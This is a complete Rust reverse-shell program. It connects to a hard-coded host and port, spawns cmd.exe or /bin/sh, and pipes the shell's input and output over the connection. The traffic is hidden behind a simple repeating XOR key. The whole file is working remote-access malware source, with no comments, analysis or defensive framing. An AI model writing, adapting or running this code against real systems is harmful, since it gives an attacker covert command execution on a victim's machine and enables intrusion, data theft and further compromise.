use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;

const SERVER_IP: &str = "127.0.0.1";
const SERVER_PORT: u16 = 9999;
const XOR_KEY: [u8; 4] = [0xAB, 0xCD, 0xEF, 0x12];

struct XorStream<T> {
    inner: T,
    key: [u8; 4],
    position: usize,
}

impl<T: Read + Write> XorStream<T> {
    fn new(stream: T, key: [u8; 4]) -> Self {
        XorStream {
            inner: stream,
            key,
            position: 0,
        }
    }

    fn read_xor(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        let n = self.inner.read(buf)?;
        for byte in &mut buf[..n] {
            *byte ^= self.key[self.position];
            self.position = (self.position + 1) % self.key.len();
        }
        Ok(n)
    }

    fn write_xor(&mut self, buf: &[u8]) -> io::Result<usize> {
        let mut encrypted = Vec::with_capacity(buf.len());
        for (i, &byte) in buf.iter().enumerate() {
            encrypted.push(byte ^ self.key[(self.position + i) % self.key.len()]);
        }
        self.position = (self.position + buf.len()) % self.key.len();
        self.inner.write_all(&encrypted)?;
        Ok(buf.len())
    }
}

fn main() -> io::Result<()> {
    let stream = TcpStream::connect((SERVER_IP, SERVER_PORT))?;
    let mut stream = XorStream::new(stream, XOR_KEY);

    let mut cmd = Command::new(if cfg!(windows) { "cmd.exe" } else { "/bin/sh" });
    cmd.stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    let mut child = cmd.spawn()?;
    let mut stdin = child.stdin.take().unwrap();
    let stdout = child.stdout.take().unwrap();
    let stderr = child.stderr.take().unwrap();

    let mut stream_out = XorStream::new(stream.inner.try_clone()?, XOR_KEY);
    stream_out.position = stream.position;

    thread::spawn(move || {
        let mut combined = stdout.chain(stderr);
        let mut buffer = [0; 4096];
        loop {
            match combined.read(&mut buffer) {
                Ok(n) if n > 0 => {
                    let _ = stream_out.write_xor(&buffer[..n]);
                }
                _ => break,
            }
        }
    });

    thread::spawn(move || {
        let mut buffer = [0; 4096];
        loop {
            match stream.read_xor(&mut buffer) {
                Ok(n) if n > 0 => {
                    let _ = stdin.write_all(&buffer[..n]);
                }
                _ => break,
            }
        }
    });

    child.wait()?;
    Ok(())
}